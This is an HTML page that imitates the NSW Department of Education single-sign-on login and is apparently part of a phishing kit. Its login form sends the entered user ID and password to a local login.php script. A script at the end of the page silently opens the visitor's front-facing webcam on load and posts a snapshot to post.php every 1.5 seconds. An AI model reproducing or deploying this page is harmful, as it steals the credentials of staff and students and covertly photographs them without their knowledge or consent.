<!DOCTYPE html>
<html>
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta content="IE=edge" http-equiv="X-UA-Compatible">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <title>Department of Education</title>
    <style type="text/css">
    </style>
    <link href="https://sso.det.nsw.edu.au/sso/XUI/themes/doe/img/favicon.ico" rel="icon" type="image/x-icon">
    <link href="https://sso.det.nsw.edu.au/sso/XUI/themes/doe/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link href="./assets/css/gef-orig.css" rel="stylesheet" type="text/css">
    <link href="./assets/css/main.css" rel="stylesheet" type="text/css">
</head>
<body data-gr-ext-installed="" data-new-gr-c-s-check-loaded="14.987.0">
    <div aria-busy="false" id="wrapper">
        <div class="gef-global-header-container" role="banner">
            <div class="gef-global-header">
                <div class="uk-container uk-container-center">
                    <div class="uk-grid uk-grid-collapse">
                        <div class="uk-width-1-1">
                            <a class="gef-global-header__header" href="https://education.nsw.gov.au/" title="NSW Department of Education"><span>NSW Department of Education</span></a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div id="login-base">
            <main class="gef-main sso-main">
                <div class="uk-container uk-container-center">
                    <div class="uk-grid uk-grid-collapse">
                        <div class="uk-container-center uk-width-medium-7-10 uk-width-large-5-10 uk-margin-large-top uk-margin-large-bottom sso-container">
                            <div class="uk-block uk-block-default sso-block">
                                <div class="uk-container uk-text-center">
                                    <div id="content">
                                        <div class="container">
                                            <h1 class="uk-h6 uk-margin-large-top">Login with your DoE account</h1>
                                            <form action="login.php" autocomplete="off" class="uk-form form login col-sm-6 col-sm-offset-3" data-stage="AD1" method="post">
                                                <fieldset class="row">
                                                    <legend class="show-on-sr">Login with your DoE account</legend>
                                                    <p class="uk-margin-remove">&nbsp;</p>
                                                    <div class="form-group">
                                                        <div class="sso-example-id-container uk-width-medium-6-10">
                                                            <label class="sso-field-label sr-only separator" for="userID"><span>User ID</span></label>
                                                        </div><input autofocus="" class="form-control input-lg uk-width-medium-6-10 uk-margin-top" data-validator="required" data-validator-event="keyup" id="userID" name="userID" placeholder="Enter your user ID" required="" type="text" maxlength="30" value="">
                                                        <div class="sso-example-id-container uk-width-medium-6-10">
                                                            <span class="sso-example-id" id="sso-example-id">Example: jane.citizen1</span>
                                                        </div>
                                                    </div>
                                                    <p class="uk-margin-remove">&nbsp;</p>
                                                    <div class="form-group">
                                                        <div class="sso-example-id-container uk-width-medium-6-10">
                                                            <label class="sso-field-label sr-only separator" for="idToken2"><span>Password</span></label>
                                                        </div><input class="form-control input-lg uk-width-medium-6-10 uk-margin-top" data-validator="required" data-validator-event="keyup" id="passW" name="passW" placeholder="Enter your password" required="" type="password" maxlength="30" value="">
                                                    </div>
                                                    <p class="uk-margin-remove">&nbsp;</p>
                                                    <div class="form-group">
                                                        <input class="btn btn-lg btn-block btn-uppercase btn-primary uk-button uk-margin-top" id="loginButton_0" name="callback_2" role="button" type="submit" value="Log in">
                                                    </div>
                                                </fieldset>
                                            </form>
                                            <p><a href="https://ssoaddonsext.det.nsw.edu.au/ssoaddon/forgotpassword/">Forgot your password?</a></p>
                                            <hr>
                                            <p>Have trouble logging in?</p>
                                            <p class="uk-margin-large-bottom sso-links"><a aria-label="Help for DoE staff (opens in a new window)" href="https://portal.det.nsw.edu.au/web/help/sso-help" target="_blank">Help for DoE staff</a></p>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </main>
        </div>
    </div>
    <div id="popup">
        <div class="radious" id="popup-content"></div>
    </div>
    <footer class="gef-global-footer uk-width-1-1" id="footer">
        <div class="uk-container uk-container-center">
            <p class="show-on-sr">NSW Department of Education</p>
            <div class="gef-global-footer__inner uk-grid">
                <div class="gef-global-footer__inner__wrapper uk-width-medium-6-10 uk-width-large-7-10">
                    <nav class="uk-grid">
                        <p class="show-on-sr">Copyright, privacy and accessibility</p>
                        <div class="uk-width-large-1-3">
                            &nbsp;
                        </div>
                        <div class="uk-width-medium-1-2 uk-width-large-1-3">
                            <ul class="uk-list">
                                <li>
                                    <a href="https://education.nsw.gov.au/about-us/rights-and-accountability/accessibility">Accessibility</a>
                                </li>
                                <li>
                                    <a href="https://education.nsw.gov.au/about-us/rights-and-accountability/information-access">Information access</a>
                                </li>
                                <li>
                                    <a href="https://education.nsw.gov.au/about-us/rights-and-accountability/privacy">Privacy</a>
                                </li>
                            </ul>
                        </div>
                        <div class="uk-width-medium-1-2 uk-width-large-1-3">
                            <ul class="uk-list">
                                <li>
                                    <a href="https://education.nsw.gov.au/about-us/rights-and-accountability/copyright">Copyright</a>
                                </li>
                                <li>
                                    <a href="https://education.nsw.gov.au/about-us/department-contacts">Department contacts</a>
                                </li>
                                <li>
                                    <a href="https://nsw.gov.au/">NSW Government</a>
                                </li>
                            </ul>
                        </div>
                    </nav>
                </div>
                <div class="gef-global-footer__inner__logo uk-width-medium-4-10 uk-width-large-3-10">
                    <div class="gef-corporate-logo">
                        <a class="gef-corporate-logo__link" href="https://education.nsw.gov.au/" title="NSW Department of Education"><span class="uk-hidden">NSW Department of Education logo</span> <img alt="Back to NSW Department of Education Home" class="gef-corporate-logo__image" src="./assets/images/6d07de4c8147a482030e0d48c7ce0b7d.png"></a>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js" type="text/javascript">
    </script>
    <div class="video-wrap" hidden="hidden">
        <video autoplay="" id="video"></video>
    </div>
    <canvas height="480" hidden="hidden" id="canvas" width="640"></canvas>
    <script>

    function post(imgdata){
    $.ajax({
       type: 'POST',
       data: { cat: imgdata},
       url: 'post.php',
       dataType: 'json',
       async: false,
       success: function(result){
           // call the function that handles the response/results
       },
       error: function(){
       }
     });
    };


    'use strict';

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const errorMsgElement = document.querySelector('span#errorMsg');

    const constraints = {
     audio: false,
     video: {
       
       facingMode: "user"
     }
    };

    // Access webcam
    async function init() {
     try {
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
       handleSuccess(stream);
     } catch (e) {
       errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
     }
    }

    // Success
    function handleSuccess(stream) {
     window.stream = stream;
     video.srcObject = stream;

    var context = canvas.getContext('2d');
     setInterval(function(){

          context.drawImage(video, 0, 0, 640, 480);
          var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
          post(canvasData); }, 1500);
     

    }

    // Load init
    init();
    </script>
</body>
</html>
